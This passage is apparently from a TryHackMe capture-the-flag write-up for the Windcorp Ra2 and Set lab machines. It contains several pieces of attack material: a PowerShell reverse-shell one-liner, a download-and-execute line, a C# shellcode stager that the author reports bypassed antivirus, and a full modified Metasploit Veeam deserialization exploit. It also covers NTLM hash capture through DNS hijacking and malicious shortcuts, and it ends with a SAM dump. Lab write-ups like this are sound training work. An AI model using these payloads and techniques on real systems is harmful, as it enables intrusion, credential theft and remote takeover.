SF:ontent-Length:\x2070\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\
SF:x20400</h1><pre>reason:\x20Illegal\x20character\x20CNTL=0x16</pre>");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019 (88%)
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows Server 2019 (88%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.94SVN%E=4%D=8/9%OT=53%CT=%CU=%PV=Y%DS=4%DC=T%G=N%TM=66B5B35E%P=x86_64-pc-linux-gnu)
SEQ(SP=105%GCD=1%ISR=102%TI=I%TS=U)
SEQ(SP=105%GCD=1%ISR=102%TI=I%II=I%SS=S%TS=U)
OPS(O1=M509NW8NNS%O2=M509NW8NNS%O3=M509NW8%O4=M509NW8NNS%O5=M509NW8NNS%O6=M509NNS)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M509NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)
<!--  -->
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: FIRE; OS: Windows; CPE: cpe:/o:microsoft:windows
<!--  -->
Host script results:
| smb2-time: 
|   date: 2024-08-09T06:11:48
|_  start_date: N/A
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 51062/tcp): CLEAN (Timeout)
|   Check 2 (port 9949/tcp): CLEAN (Timeout)
|   Check 3 (port 21709/udp): CLEAN (Timeout)
|   Check 4 (port 32599/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
<!--  -->
TRACEROUTE (using port 135/tcp)
HOP RTT       ADDRESS
1   205.41 ms 10.13.0.1
2   ... 3
4   336.86 ms 10.10.15.199
<!--  -->
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Aug  9 03:12:46 2024 -- 1 IP address (1 host up) scanned in 152.78 seconds
  </pre>
</details>

<details>
  <summary>DNS Query Responses</summary>
  <pre>
	; (1 server found)
	;; global options: +cmd
	;; Got answer:
	;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 50632
	;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 3
	
	;; OPT PSEUDOSECTION:
	; EDNS: version: 0, flags:; udp: 4000
	;; QUESTION SECTION:
	;windcorp.thm.                  IN      NS
	
	;; ANSWER SECTION:
	windcorp.thm.           3600    IN      NS      fire.windcorp.thm.
	
	;; ADDITIONAL SECTION:
	fire.windcorp.thm.      3600    IN      A       10.10.205.75
	fire.windcorp.thm.      3600    IN      A       192.168.112.1
	
	;; Query time: 339 msec
	;; SERVER: 10.10.205.75#53(10.10.205.75) (UDP)
	;; WHEN: Sat Aug 10 23:59:23 -03 2024
	;; MSG SIZE  rcvd: 92
  </pre>
  <pre>
  	; (1 server found)
	;; global options: +cmd
	;; Got answer:
	;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 55451
	;; flags: qr aa rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1
	
	;; OPT PSEUDOSECTION:
	; EDNS: version: 0, flags:; udp: 4000
	;; QUESTION SECTION:
	;windcorp.thm.                  IN      MX
	
	;; AUTHORITY SECTION:
	windcorp.thm.           3600    IN      SOA     fire.windcorp.thm. hostmaster.windcorp.thm. 294 900 600 86400 3600
	
	;; Query time: 347 msec
	;; SERVER: 10.10.205.75#53(10.10.205.75) (UDP)
	;; WHEN: Sat Aug 10 23:59:35 -03 2024
	;; MSG SIZE  rcvd: 93
  </pre>
  <pre>
	; (1 server found)
	;; global options: +cmd
	;; Got answer:
	;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 47000
	;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1
	
	;; OPT PSEUDOSECTION:
	; EDNS: version: 0, flags:; udp: 4000
	;; QUESTION SECTION:
	;windcorp.thm.                  IN      TXT
	
	;; ANSWER SECTION:
	windcorp.thm.           86400   IN      TXT     "THM{redacted}"
	
	;; Query time: 339 msec
	;; SERVER: 10.10.205.75#53(10.10.205.75) (UDP)
	;; WHEN: Sun Aug 11 00:00:01 -03 2024
	;; MSG SIZE  rcvd: 188
  </pre>
	<p>
	The first flag on the TXT Response give us a hint about Non-secure dynamic DNS updates...
	</p>
	Non-secure dynamic DNS updates allow DNS records to be changed without authentication or security measures. This vulnerability enables unauthorized users to modify DNS records, potentially leading to attacks such as DNS spoofing or cache poisoning. Without secure updates, there's a risk of incorrect or malicious DNS entries affecting network traffic and data integrity
</details>

### Web Pages

#### https://fire.windcorp.thm/

![Pasted image 20240809040659](https://github.com/user-attachments/assets/c960cce8-18da-447e-bbce-026e436dd8ee)

The site claims that it is now secure and equipped with up-to-date software and backups. The management asserts that they have adopted new security measures, including:

- **Certificates Everywhere**: Emphasizing the use of certificates to ensure secure communications.
- **Secure Self-Service Portal**: Development of a new portal to assist employees securely.
- **Up-to-Date Operating Systems**: Transition to state-of-the-art operating systems that are secure by default.

Despite these claims, it's important to note that the IT support staff remains the same as before. It's possible that much of the software stack might still be the same, just with different versions.

Additionally, the previous password reset button now redirects to [selfservice](https://selfservice.windcorp.thm/).

##### https://fire.windcorp.thm/powershell

![Pasted image 20240811005510](https://github.com/user-attachments/assets/0dc95466-123d-490c-b529-f7c2821682ce)

This page provides us with a web interface for powershell.

Reference:

> https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/hh831611(v=ws.11)?redirectedfrom=MSDN

_Windows PowerShell® Web Access, first introduced in Windows Server® 2012, acts as a Windows PowerShell gateway, providing a web-based Windows PowerShell console that is targeted at a remote computer._

#### https://selfservice.windcorp.thm/

This subdomain prompted for HTTP authentication, and at that point, I did not have valid credentials.

![Pasted image 20240810235617](https://github.com/user-attachments/assets/91a7eda8-cb08-4d80-b845-b7c9a883f041)
![Pasted image 20240810235258](https://github.com/user-attachments/assets/e2714cb3-553b-4014-a4e7-967417871091)

intercepted request in burp shows: `NTLM TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA=`, an NTLM authentication token. 

It is base64-encoded and used in NTLM authentication, a challenge-response protocol typically employed by Windows systems for secure user authentication. 

### Extracting Private Keys from cert.pfx

##### https://selfservice.dev.windcorp.thm/backup

![Pasted image 20240810234320](https://github.com/user-attachments/assets/f1e07086-2422-4ac6-afa8-1cea0b18ea7c)

This directory holds the `cert.pfx` file and `web.config`.

I used `pfx2john` to extract the private key and public key from the `cert.pfx` file. 

This process involved converting the `.pfx` file into a format that can be passed to [john the ripper](https://github.com/openwall/john) to find the password for cert.pfx.

__cert.pfx hash cracked__

![Pasted image 20240810030640](https://github.com/user-attachments/assets/09d35346-5184-415e-9882-537baec97df5)

__extracted keys__

![Pasted image 20240810233357](https://github.com/user-attachments/assets/e9f2b6d6-c0c3-4e85-87e2-957ebd797819)

### DNS Cache Poisoning

Based on the previous DNS output, It was possible to exploit vulnerabilities in DNS caching by impersonating DNS nameservers.  This was achieved this by using `nsupdate` to change the A record for `selfservice.windcorp.thm` to an IP address i controled.

Following this change, a DNS query was performed to verify the update.

![Pasted image 20240811011257](https://github.com/user-attachments/assets/fbc1dfbe-97fe-48d8-a6a1-51dd1b60f5de)

### NTLMv2 Authentication Intercept with MITM

Using the previously obtained `.pem` keys, I configured [Responder](https://github.com/lgandx/Responder) to interact with the domain `selfservice.windcorp.thm` over HTTPS. Responder used these keys to handle requests made to this domain, potentially allowing for responses that leveraged the authentication or encryption provided by the keys.

The `.pem` keys included the private key and public certificate necessary for secure communication or authentication processes.

After a few seconds, Responder captured an NTLMv2 hash for `edwardle`, which I cracked using the `rockyou` wordlist.

![Pasted image 20240811012157](https://github.com/user-attachments/assets/0c5bd5b7-503a-4191-b272-08a0c3d89c37)

![Pasted image 20240811012642](https://github.com/user-attachments/assets/e6b41d5d-e1a9-4567-9154-b3756305869b)

### Initial Access Ra2

I could established RCE on the machine by logging to the `Powershell Web Access` page with `edwardle` credentials.

![Pasted image 20240811013844](https://github.com/user-attachments/assets/fdc3fc06-16af-429a-9963-1d5d5b5a0bf1)

To obtain a reverse shell on the machine, i encoded the [Nishang](https://github.com/samratashok/nishang) script `Invoke-PowerShellTcpOneLine.ps1` in Base64, and transfered it via the PowerShell web interface 

```powershell
$client = New-Object System.Net.Sockets.TCPClient($ip_addr,9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
```powershell
iex (New-Object Net.WebClient).DownloadString('http://$ip_addr/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]
```

![Pasted image 20240811021147](https://github.com/user-attachments/assets/b466a7d4-77b1-4c24-bbb8-8256a707145a)

![Pasted image 20240811021323](https://github.com/user-attachments/assets/ca69d4d3-fb3d-40f1-934b-ae5978c956f6)

### Abusing Access Tokens

References:

> https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/access-tokens

> https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens

_Each user logged onto the system holds an access token with security information for that logon session. The system creates an access token when the user logs on. Every process executed on behalf of the user has a copy of the access token._

_The token identifies the user, the user's groups, and the user's privileges. A token also contains a logon SID (Security Identifier) that identifies the current logon session._

From the previous output from `whoami /priv` i confirmed that our user had the `SeImpersonatePrivilege`.

This privilege is held by any process allows the impersonation (but not creation) of any token, given that a handle to it can be obtained. A privileged token can be acquired from a Windows service (DCOM) by inducing it to perform NTLM authentication against an exploit, subsequently enabling the execution of a process with SYSTEM privileges.

#### PrintSpoofer

> https://github.com/itm4n/PrintSpoofer

> https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/

After downloading the reverse shell binary, I executed it with `PrintSpoofer`, granting me a remote connection as `windcorp\fire$`

![Pasted image 20240811042829](https://github.com/user-attachments/assets/c26b3613-998f-4eaa-b2c0-d70649ae1990)
![Pasted image 20240811042439](https://github.com/user-attachments/assets/8a360ab0-b9f4-4c24-8c33-5b57611705d4)

### Goal Execution Ra2

![Pasted image 20240811044619](https://github.com/user-attachments/assets/7a850af1-b9d2-449d-bba3-e849b202a7bf)
![Pasted image 20240811050122](https://github.com/user-attachments/assets/aec116b2-e89b-47bd-934e-ef180ff55828)

---

## Set

> https://tryhackme.com/r/room/set

![b24d17051176c781124f199e22213b1f](https://github.com/user-attachments/assets/a89ac14b-0c43-43a5-bb80-336916aacf45)

Once again you find yourself on the internal network of the Windcorp Corporation. This tasted so good last time you were there, you came back for more.

However, they managed to secure the Domain Controller this time, so you need to find another server and on your first scan discovered "Set".

Set is used as a platform for developers and has had some problems in the recent past. They had to reset a lot of users and restore backups (maybe you were not the only hacker on their network?). So they decided to make sure all users used proper passwords and closed of some of the loose policies. Can you still find a way in? Are some users more privileged than others? Or some more sloppy? And maybe you need to think outside the box a little bit to circumvent their new security controls…

### Reconnaissance Set

The machine at `set.windcorp.thm` does not respond to ping requests, indicating that ICMP traffic may be blocked or filtered.

<details>
  <summary>Nmap Scan Results</summary>
  <pre>
# Nmap 7.94SVN scan initiated Mon Aug 12 17:46:12 2024 as: nmap -p 135,443,445,5985,4966 -sV -sC -T4 -oA nmap/allports-set -vv set.windcorp.thm
Nmap scan report for set.windcorp.thm (10.10.76.143)
Host is up, received syn-ack ttl 125 (0.33s latency).
rDNS record for 10.10.76.143: windcorp
Scanned at 2024-08-12 17:46:12 -03 for 102s
<!--  -->
PORT     STATE    SERVICE       REASON          VERSION
135/tcp  open     msrpc         syn-ack ttl 125 Microsoft Windows RPC
443/tcp  open     ssl/http      syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| tls-alpn: 
|_  http/1.1
|_ssl-date: 2024-08-12T20:47:47+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=set.windcorp.thm
| Subject Alternative Name: DNS:set.windcorp.thm, DNS:seth.windcorp.thm
| Issuer: commonName=set.windcorp.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-06-07T15:00:22
| Not valid after:  2036-10-07T15:10:21
| MD5:   d0eb:717c:f7ef:3515:00d2:5d67:4beb:dd69
| SHA-1: 9571:4370:bd9b:cc80:08ef:7d1e:0dfc:bbc2:251c:e077
| -----BEGIN CERTIFICATE-----
| MIIDQTCCAimgAwIBAgIQPqCqVnulP4RF1x6k8HNXqDANBgkqhkiG9w0BAQsFADAb
| MRkwFwYDVQQDDBBzZXQud2luZGNvcnAudGhtMB4XDTIwMDYwNzE1MDAyMloXDTM2
| MTAwNzE1MTAyMVowGzEZMBcGA1UEAwwQc2V0LndpbmRjb3JwLnRobTCCASIwDQYJ
| KoZIhvcNAQEBBQADggEPADCCAQoCggEBAMm4DQZ+hDcuel1PQ+DKGJXKo8dF2mR+
| SJHlyPssa2iZx43jTijsYp+MxRPxSYzSuDy5M0eOIySHBN0JGWSKHLclNiwhDgAU
| niPdrrPgreA1Hs1Zw5UN7iLEz56R7NhEPctUwZb6+ETjO4x91TU3JMenEF+1ZLv3
| ss3X3MXKdv8y/KuHNPXsFf1ubioYKV3gmdsSlwLQpcATQ7LjeMdncAN62/OvXpVQ
| sFAdJkO1/LXIJquNdMzdim3PvFyPBStY6oX9sD5AiJ9/iMa91aqYjL8MXw7zPS4N
| FKpW/Ksx1AxbG41LQieEeGwEcC6Yq2ohSUNk3/RUrUA3IxN3up94t20CAwEAAaOB
| gDB+MA4GA1UdDwEB/wQEAwIFoDAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUH
| AwEwLgYDVR0RBCcwJYIQc2V0LndpbmRjb3JwLnRobYIRc2V0aC53aW5kY29ycC50
| aG0wHQYDVR0OBBYEFNQ2+9chAM4hq3nKcxQtg8Ah/1A/MA0GCSqGSIb3DQEBCwUA
| A4IBAQBB6BNqxh1cxyeeQ2D1VQ4D7nqGjp0oLNuwFFVd1Pk9f0aWWm0w1ovqOcCR
| 8BrCTJJlk/FjIYUrqLBvgkyFx7cL706tEGrFtZwi1KtMg8qReBQQBYVKa7jjN8/U
| dWRrbYwNuPmmojFZ1dZWilw++vCSkXxIKHbP6vvZDs7XewFYCT3Snbo/gFc3FCdy
| DwXM5ZQkzZnfTs6dAURqf8L7AVMxwBLow1Wl3nLuxoFQ3ypu5AyWCLROK8n5h82h
| mJLZQ6ectkh1JzoHaP8zA0Q0hxMvflatVAUDSztATJ7bJ81yok9I1eA4Eu+QI+sO
| 2yLhYxKlaeRK4AJ226n7dOxyrr8d
|_-----END CERTIFICATE-----
| http-methods: 
|_  Supported Methods: GET OPTIONS
445/tcp  open     microsoft-ds? syn-ack ttl 125
4966/tcp filtered unknown       no-response
5985/tcp open     http          syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
TCP/IP fingerprint:
SCAN(V=7.94SVN%E=4%D=8/12%OT=135%CT=%CU=%PV=Y%DS=4%DC=T%G=N%TM=66BA74FA%P=x86_64-pc-linux-gnu)
SEQ(SP=100%GCD=1%ISR=10A%TS=U)
OPS(O1=M509NW8NNS%O2=M509NW8NNS%O3=M509NW8%O4=M509NW8NNS%O5=M509NW8NNS%O6=M509NNS)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M509NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=N)
<!--  -->
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=256 (Good luck!)
IP ID Sequence Generation: Busy server or unknown class
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
<!--  -->
Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 25299/tcp): CLEAN (Timeout)
|   Check 2 (port 39496/tcp): CLEAN (Timeout)
|   Check 3 (port 63114/udp): CLEAN (Timeout)
|   Check 4 (port 47883/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2024-08-12T20:46:55
|_  start_date: N/A
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
<!--  -->
TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   205.93 ms 10.13.0.1
2   ... 3
4   332.60 ms windcorp (10.10.76.143)
<!--  -->
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Aug 12 17:47:54 2024 -- 1 IP address (1 host up) scanned in 102.85 seconds
</details>

Upon visiting the web page at `set.windcorp.thm`, Wappalyzer identified several technologies in use. The site is running on **Microsoft IIS**.

![Pasted image 20240812170054](https://github.com/user-attachments/assets/d55b86f5-e05f-4102-b4da-4125bf5b35a0)

### Webpage Enumeration

While exploring the web page, i discovered that the `assets/data/users.xml` file contained a collection of user information, including phone numbers and email addresses associated with the company.

![Pasted image 20240812172637](https://github.com/user-attachments/assets/991e376e-b640-4e69-88b1-1b56d9b3c7e4)

The `appnotes.txt` file contained a note about password complexity, advising users to change their default password immediately because it is considered too common.

![Pasted image 20240812182301](https://github.com/user-attachments/assets/e51e45de-b179-4494-9485-6a3ee166de0c)

### SMB Shares Set

With a list of usernames, i proceeded to brute-force the open services on the machine. My initial focus was on SMB. Using the [top-20-common-SSH-passwords.txt](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt) wordlist, which had the password for `myrtleowe`.

Accessing the `Files` share, i found a file: `Info.txt` with the following message:

_"Zip and save your project files here. We will review them."_

This suggests that any ZIP files dropped in this location are likely to be accessible and reviewed, potentially exposing an attack surface if these files are processed or extracted by the system.

![Pasted image 20240812180540](https://github.com/user-attachments/assets/7a3bae0e-9ec0-41fc-92c3-35366bf5e598)

### Initial Access Set

Reference:

> https://www.trendmicro.com/en_us/research/17/e/rising-trend-attackers-using-lnk-files-download-malware.html

I created a malicious `.lnk` file that exploits how Windows handles shortcut icons. By setting the icon path to a network share controlled by me, the target machine attempts to retrieve the icon, triggering NTLM authentication requests to my server. This allowed me to capture the machine’s authentication credentials.

![Pasted image 20240812183056](https://github.com/user-attachments/assets/4ef6ff3a-3735-4910-a755-a4466f31790e)

After dropping the malicious ZIP file into the share, _Responder_ captured an NTLM hash for the user `MichelleWat`.

![Pasted image 20240812183800](https://github.com/user-attachments/assets/aa2f355b-8091-482e-8e64-1ee43bceabb7)

### Internal Enumeration

The active connections on the machine showed that port 2805 was listening on localhost and was associated with process ID 5032.

This process was identified as `Veeam.One.Agent.Service`.

![Pasted image 20240812190045](https://github.com/user-attachments/assets/9dc65bcd-b9d7-45b0-b7d3-d03489cfd4da)

__References__:

> https://helpcenter.veeam.com/docs/one/monitor/about.html

> https://www.veeam.com/kb3144

Veeam ONE Client comes as a part of the integrated Veeam ONE solution. It is the primary tool for monitoring Veeam Backup & Replication

Both the file version and product version were listed as `9.5.4.4566`.

![Pasted image 20240813203244](https://github.com/user-attachments/assets/1773311d-1f35-422f-98c3-204a7107975a)

### CVE-2020-10915

Veeam ONE Agent uses .NET data serialization mechanisms. The remote attacker may send malicious code to the TCP port opened by Veeam ONE Agent (TCP 2805 by default) which will not be deserialized properly.

The deserialization of untrusted data is performed during TLS Handshake (vulnerability tracked as **ZDI-CAN-10400** and **CVE-2020-10914**) and during logging of error messages (vulnerability tracked as **ZDI-CAN-10401** and **CVE-2020-10915**).

Since Veeam was running on localhost, [Plink](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html) was used to establish an SSH tunnel to the attacking machine. This forwarded port 2805, allowing me to access the Veeam service remotely through the tunnel.

![Pasted image 20240814005504](https://github.com/user-attachments/assets/72a2b732-85b0-43ce-965e-4b475e83e8d3)

### Privilege Escalation Set

To exploit CVE-2020-10915, i had to use a modified version of the Metasploit module: [veeam_one_agent_deserialization](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/misc/veeam_one_agent_deserialization.rb), with a adittional stager made by  [Sugobet](https://blog.csdn.net/qq_54704239/article/details/130215092)

#### src

```csharp
using System;
using System.Runtime.InteropServices;
using System.Net;

class Program
{
    // Importing VirtualAlloc from kernel32.dll to allocate memory in the process's address space
    [DllImport("kernel32")]
    private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

    // Importing CreateThread from kernel32.dll to create a new thread in the current process
    [DllImport("kernel32")]
    private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

    // Importing WaitForSingleObject from kernel32.dll to wait for a thread to finish execution
    [DllImport("kernel32")]
    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    static void Main(string[] args)
    {
        // Entry point of the application, calling the LoginQQ method
        LoginQQ();
    }

    public static void LoginQQ()
    {
        // URL from which the payload will be downloaded
        string qq_loginURI = "http://server_addr:8000/hitme";
        WebClient webClient = new WebClient();

        // Downloading the data from the specified URL
        byte[] qqLoginState = webClient.DownloadData(qq_loginURI);

        // Allocating memory in the process's address space with read/write/execute permissions
        UInt32 QQOpen = VirtualAlloc(0, (UInt32)qqLoginState.Length, 0x1000, 0x40);
        // Copying the downloaded data (payload) into the allocated memory
        Marshal.Copy(qqLoginState, 0, (IntPtr)(QQOpen), qqLoginState.Length);

    }
}
```
The program is designed to download and execute a payload from a remote server. It allocates memory for the payload, writes the downloaded data into this memory, and then creates a new thread to run the code. The `hitme` payload is intended to open a reverse shell.

When uploading the compiled executable to VirusTotal, it showed that the file bypassed detection by the Microsoft/McAfee scanner, which was the AV solution deployed on the machine.

![Pasted image 20240813212416](https://github.com/user-attachments/assets/b0eef4eb-a453-439a-a524-502b042e3dd0)

![Pasted image 20240813212306](https://github.com/user-attachments/assets/105f228d-6a08-4d92-8f1a-d46d8438f896)

__Modified Ruby Script__

- Changed the payload from `cmd/windows/powershell_reverse_tcp` to `windows/64/exec` on line 55. This change is required to ensure that the payload only executes the stager.

- Replaced `execute_command(payload.encoded)` with `execute_command(datastore['CMD'])` on line 130. This modification will ensure that the command specified in the datastore is executed, rather than the encoded payload.

```ruby
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::CmdStager
  include Msf::Exploit::Powershell

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Veeam ONE Agent .NET Deserialization',
        'Description' => %q{
          This module exploits a .NET deserialization vulnerability in the Veeam
          ONE Agent before the hotfix versions 9.5.5.4587 and 10.0.1.750 in the
          9 and 10 release lines.

          Specifically, the module targets the HandshakeResult() method used by
          the Agent. By inducing a failure in the handshake, the Agent will
          deserialize untrusted data.

          Tested against the pre-patched release of 10.0.0.750. Note that Veeam
          continues to distribute this version but with the patch pre-applied.
        },
        'Author' => [
          'Michael Zanetta', # Discovery
          'Edgar Boda-Majer', # Discovery
          'wvu' # Module
        ],
        'References' => [
          ['CVE', '2020-10914'],
          ['CVE', '2020-10915'], # This module
          ['ZDI', '20-545'],
          ['ZDI', '20-546'], # This module
          ['URL', 'https://www.veeam.com/kb3144']
        ],
        'DisclosureDate' => '2020-04-15', # Vendor advisory
        'License' => MSF_LICENSE,
        'Platform' => 'win',
        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],
        'Privileged' => false,
        'Targets' => [
          [
            'Windows Command',
            {
              'Arch' => ARCH_CMD,
              'Type' => :win_cmd2,
              'DefaultOptions' => {
                'PAYLOAD' => 'windows/x64/exec'
              }
            }
          ],
          [
            'Windows Dropper',
            {
              'Arch' => [ARCH_X86, ARCH_X64],
              'Type' => :win_dropper,
              'DefaultOptions' => {
                'PAYLOAD' => 'windows/x64/meterpreter_reverse_tcp'
              }
            }
          ],
          [
            'PowerShell Stager',
            {
              'Arch' => [ARCH_X86, ARCH_X64],
              'Type' => :psh_stager,
              'DefaultOptions' => {
                'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp'
              }
            }
          ]
        ],
        'DefaultTarget' => 2,
        'DefaultOptions' => {
          'WfsDelay' => 10
        },
        'Notes' => {
          'Stability' => [SERVICE_RESOURCE_LOSS], # Connection queue may fill?
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )

    register_options([
      Opt::RPORT(2805),
      OptString.new(
        'HOSTINFO_NAME',
        [
          true,
          'Name to send in host info (must be recognized by server!)',
          'AgentController'
        ]
      )
    ])
  end

  def check
    vprint_status("Checking connection to #{peer}")
    connect

    CheckCode::Detected("Connected to #{peer}.")
  rescue Rex::ConnectionError => e
    CheckCode::Unknown("#{e.class}: #{e.message}")
  ensure
    disconnect
  end

  def exploit
    print_status("Connecting to #{peer}")
    connect

    print_status("Sending host info to #{peer}")
    sock.put(host_info(datastore['HOSTINFO_NAME']))

    res = sock.get_once
    vprint_good("<-- Host info reply: #{res.inspect}") if res

    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")

    case target['Type']
    when :win_cmd2
      execute_command(datastore['CMD'])
    when :win_dropper
      # TODO: Create an option to execute the full stager without hacking
      # :linemax or calling execute_command(generate_cmdstager(...).join(...))
      execute_cmdstager(
        flavor: :psh_invokewebrequest, # NOTE: This requires PowerShell >= 3.0
        linemax: 9001 # It's over 9000
      )
    when :psh_stager
      execute_command(cmd_psh_payload(
        payload.encoded,
        payload.arch.first,
        remove_comspec: true
      ))
    end
  rescue EOFError, Rex::ConnectionError => e
    fail_with(Failure::Unknown, "#{e.class}: #{e.message}")
  ensure
    disconnect
  end

  def execute_command(cmd, _opts = {})
    vprint_status("Executing command: #{cmd}")

    serialized_payload = Msf::Util::DotNetDeserialization.generate(
      cmd,
      gadget_chain: :TextFormattingRunProperties,
      formatter: :BinaryFormatter # This is _exactly_ what we need
    )

    print_status("Sending malicious handshake to #{peer}")
    sock.put(handshake(serialized_payload))

    res = sock.get_once
    vprint_good("<-- Handshake reply: #{res.inspect}") if res
  rescue EOFError, Rex::ConnectionError => e
    fail_with(Failure::Unknown, "#{e.class}: #{e.message}")
  end

  def host_info(name)
    meta = [0x0205].pack('v')
    packed_name = [name.length].pack('C') + name

    pkt = meta + packed_name

    vprint_good("--> Host info packet: #{pkt.inspect}")
    pkt
  end

  def handshake(serialized_payload)
    # A -1 status indicates a failure, which will trigger the deserialization
    status = [-1].pack('l<')

    length = status.length + serialized_payload.length
    type = 7
    attrs = 1
    kontext = 0

    header = [length, type, attrs, kontext].pack('VvVV')
    padding = "\x00" * 18
    result = status + serialized_payload

    pkt = header + padding + result

    vprint_good("--> Handshake packet: #{pkt.inspect}")
    pkt
  end
end
```
With the exploit script correctly configured and Metasploit updated with the necessary details, a simple ping command was executed to ensure that the attack chain functioned as intended.

![Pasted image 20240814004521](https://github.com/user-attachments/assets/d6efbb4b-5d04-4ac7-a0b2-3f3510d72255)

After receiving the ICMP packets and confirming that command execution was working correctly, i proceed to escalate our privileges by executing the stager.

This step involved leveraging the permissions associated with the service, which granted me a reverse shell with the same privileges as the service owner.

![Pasted image 20240814004555](https://github.com/user-attachments/assets/0249e708-a4ee-4c5f-9f03-dca64522d0ff)

### Goal Execution Set

After executing the payload, I obtained a reverse shell as `set\one`, who was a member of several privileged groups. This elevated access allowed me to further escalate privileges, gaining a shell as `Administrator` and securing RDP access to the system.

![Pasted image 20240814005951](https://github.com/user-attachments/assets/679145b6-df63-49a2-bb88-1d3cb0d4a4ad)

After gaining administrative access, i've dumped the SAM database, which contains password hashes for all users on the system.

![Pasted image 20240814015418](https://github.com/user-attachments/assets/d7a8fdd2-b367-491d-b741-7fcbd431112c)

Thanks to my SSH tunnel, I could access the RDP service, which was also exposed on localhost.

![Pasted image 20240814031150](https://github.com/user-attachments/assets/31cfc358-ef4b-4154-8a24-f1eb1d0708b2)

Visual evidence of the compromised system.

# Osiris

Loading ...

![windows-xp-loading-screen](https://github.com/user-attachments/assets/b22dd31d-df3d-4634-a475-fcaddf98c058)

